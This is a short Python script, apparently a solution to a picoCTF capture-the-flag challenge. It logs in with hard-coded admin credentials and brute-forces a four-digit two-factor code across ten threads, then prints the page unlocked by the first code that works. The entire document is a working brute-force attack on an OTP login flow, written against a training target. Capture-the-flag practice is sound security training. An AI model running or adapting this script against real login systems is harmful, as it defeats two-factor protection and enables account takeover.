import requests
import threading

URL = "http://foggy-cliff.picoctf.net:59770"
USER = "admin"
PWD = "apple@123"

found = False

def try_otp(start, end):
    global found
    for i in range(start, end):
        if found:
            return
        
        try:
            s = requests.Session()
            s.post(URL + "/login", data={"username": USER, "password": PWD}, timeout=3)
            
            otp = str(i).zfill(4)
            r = s.post(URL + "/two_fa", data={"otp": otp}, timeout=3)
            
            if "Login successful" in r.text:
                found = True
                print("\nOTP correcto:", otp)
                print(s.get(URL + "/").text)
                return

        except:
            continue

# Crear hilos (ej: 10)
threads = []
step = 1000

for i in range(0, 10000, step):
    t = threading.Thread(target=try_otp, args=(i, i+step))
    threads.append(t)
    t.start()

for t in threads:
    t.join()